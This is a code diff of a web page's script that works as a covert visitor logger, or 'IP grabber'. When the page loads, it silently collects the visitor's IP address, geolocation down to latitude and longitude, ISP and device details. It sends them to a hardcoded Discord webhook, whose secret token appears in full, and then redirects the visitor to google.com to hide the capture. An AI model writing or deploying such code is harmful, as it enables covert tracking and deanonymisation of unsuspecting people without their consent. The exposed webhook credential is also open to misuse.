@@ -11,32 +11,42 @@
         const webhookURL = 'https://discord.com/api/webhooks/1306241739346018404/r_uDL2KtEA2RJ9X2NwsATtD_5IC_R-GZ2FsyP5ljOFNjd9SUxbQuzpzWeWfPq8pyemi5';
         const redirectURL = 'https://www.google.com';
 
-        // Function to get IP and location details
+        // Fetch IP and location details using ip-api
         async function getIPAddressAndLocation() {
             try {
-                const response = await fetch('https://api.ipify.org?format=json');
-                const { ip } = await response.json();
-                const locationResponse = await fetch(`https://ip-api.com/json/${ip}`);
-                const locationData = await locationResponse.json();
-
-                return {
-                    ip,
-                    location: locationData.status === "success" ? locationData : null
-                };
+                const response = await fetch('https://ip-api.com/json/');
+                const data = await response.json();
+                if (data.status === "success") {
+                    return {
+                        ip: data.query,
+                        locationDetails: {
+                            city: data.city,
+                            region: data.regionName,
+                            country: data.country,
+                            isp: data.isp,
+                            timezone: data.timezone,
+                            latitude: data.lat,
+                            longitude: data.lon
+                        }
+                    };
+                }
+                return { ip: 'Unknown', locationDetails: null };
             } catch (error) {
                 console.error('Error fetching IP or location:', error);
-                return { ip: 'Unknown', location: null };
+                return { ip: 'Unknown', locationDetails: null };
             }
         }
 
         // Function to collect additional device information
-        async function getDeviceInfo() {
+        function getDeviceInfo() {
             const userAgent = navigator.userAgent;
             const platform = navigator.platform;
             const language = navigator.language;
             const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-            const colorDepth = window.screen.colorDepth + ' bits';
+            const colorDepth = `${window.screen.colorDepth} bits`;
             const cookiesEnabled = navigator.cookieEnabled ? 'Yes' : 'No';
+            const screenResolution = `${window.screen.width}x${window.screen.height}`;
+            const isMobile = /Mobi|Android/i.test(userAgent) ? 'Yes' : 'No';
 
             let os = 'Unknown';
             if (/windows nt/i.test(userAgent)) {
@@ -55,32 +65,34 @@
                 os = versionMatch ? `iOS ${versionMatch[1].replace('_', '.')}` : 'iOS';
             }
 
-            return `
-                User-Agent: ${userAgent}
-                Platform: ${platform}
-                Language: ${language}
-                Timezone: ${timezone}
-                OS: ${os}
-                Color Depth: ${colorDepth}
-                Cookies Enabled: ${cookiesEnabled}
-            `;
+            return {
+                userAgent,
+                platform,
+                language,
+                timezone,
+                colorDepth,
+                cookiesEnabled,
+                screenResolution,
+                isMobile,
+                os
+            };
         }
 
         // Function to send data to Discord webhook
         async function sendToDiscord() {
-            const { ip, location } = await getIPAddressAndLocation();
-            const deviceInfo = await getDeviceInfo();
+            const ipAndLocation = await getIPAddressAndLocation();
+            const deviceInfo = getDeviceInfo();
             const timestamp = new Date().toLocaleString();
 
-            const locationDetails = location
+            const locationDetails = ipAndLocation.locationDetails
                 ? `
-                City: ${location.city}
-                Region: ${location.regionName}
-                Country: ${location.country}
-                ISP: ${location.isp}
-                Timezone: ${location.timezone}
-                Latitude: ${location.lat}
-                Longitude: ${location.lon}
+                City: ${ipAndLocation.locationDetails.city}
+                Region: ${ipAndLocation.locationDetails.region}
+                Country: ${ipAndLocation.locationDetails.country}
+                ISP: ${ipAndLocation.locationDetails.isp}
+                Timezone: ${ipAndLocation.locationDetails.timezone}
+                Latitude: ${ipAndLocation.locationDetails.latitude}
+                Longitude: ${ipAndLocation.locationDetails.longitude}
                 `
                 : 'Location information unavailable';
 
@@ -89,32 +101,45 @@
                     title: "📋 Visitor Information Logged",
                     color: 3447003,
                     fields: [
-                        { name: "IP Address", value: ip, inline: true },
-                        { name: "Device Info", value: `\`\`\`${deviceInfo}\`\`\`` },
+                        { name: "IP Address", value: ipAndLocation.ip, inline: true },
+                        { name: "Device Info", value: `
+                            OS: ${deviceInfo.os}
+                            User-Agent: ${deviceInfo.userAgent}
+                            Platform: ${deviceInfo.platform}
+                            Language: ${deviceInfo.language}
+                            Screen Resolution: ${deviceInfo.screenResolution}
+                            Color Depth: ${deviceInfo.colorDepth}
+                            Cookies Enabled: ${deviceInfo.cookiesEnabled}
+                            Mobile Device: ${deviceInfo.isMobile}
+                        `, inline: false },
                         { name: "Approximate Location", value: `\`\`\`${locationDetails}\`\`\`` }
                     ],
                     footer: { text: `Logged at: ${timestamp}` }
                 }]
             };
 
-            fetch(webhookURL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
-            })
-            .then(response => {
+            try {
+                const response = await fetch(webhookURL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
                 if (response.ok) {
                     console.log('Visitor info logged successfully');
-                    window.location.href = redirectURL;
                 } else {
                     console.error('Failed to log visitor info:', response.statusText);
                 }
-            })
-            .catch(error => console.error('Error sending to webhook:', error));
+            } catch (error) {
+                console.error('Error sending to webhook:', error);
+            }
         }
 
-        // Execute the data collection and logging
-        sendToDiscord();
+        // Execute the data collection and logging, then redirect
+        sendToDiscord().finally(() => {
+            setTimeout(() => {
+                window.location.href = redirectURL;
+            }, 3000); // Redirect after 3 seconds
+        });
     </script>
 </body>
 </html>
